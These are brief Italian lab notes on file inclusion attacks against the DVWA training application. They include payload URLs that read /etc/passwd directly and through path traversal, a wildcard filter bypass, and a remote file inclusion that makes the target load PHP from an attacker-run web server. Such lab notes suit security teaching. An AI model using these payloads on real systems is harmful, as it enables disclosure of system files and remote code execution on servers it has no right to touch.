#Una file inclusion è una vulnerabilità che permette ad un attaccante di includere file esterni in un file sorgente.

#ES : http://dvwa/vulnerabilities/fi/?page=include.php
In questo modo stiamo richiedendo al server la risorsa include.php

Possiamo provare ad inserire un file esterno come ad esempio /etc/passwd
#ES : http://dvwa/vulnerabilities/fi/?page=/etc/passwd

Oppure effettuare una path traversal 
#ES : http://dvwa/vulnerabilities/fi/?page=../../../../etc/passwd

#In caso siano presenti alcuni filtri per il path
http://172.17.0.2:8000/?path=./../../etc/passw*



#Un'altra possibilità è inserire nell'url una risorsa remota
Sulla macchina kali creimo un file include.php.
<?php echo '<p>Hello World</p>'; ?>
python3 -m http.server 8081 --> creiamo un server web a 192.168.56.6 ( il nostro ip vediante ip a)
#ES : http://dvwa/vulnerabilities/fi/?page=http://192.168.56.6:8081/include.php
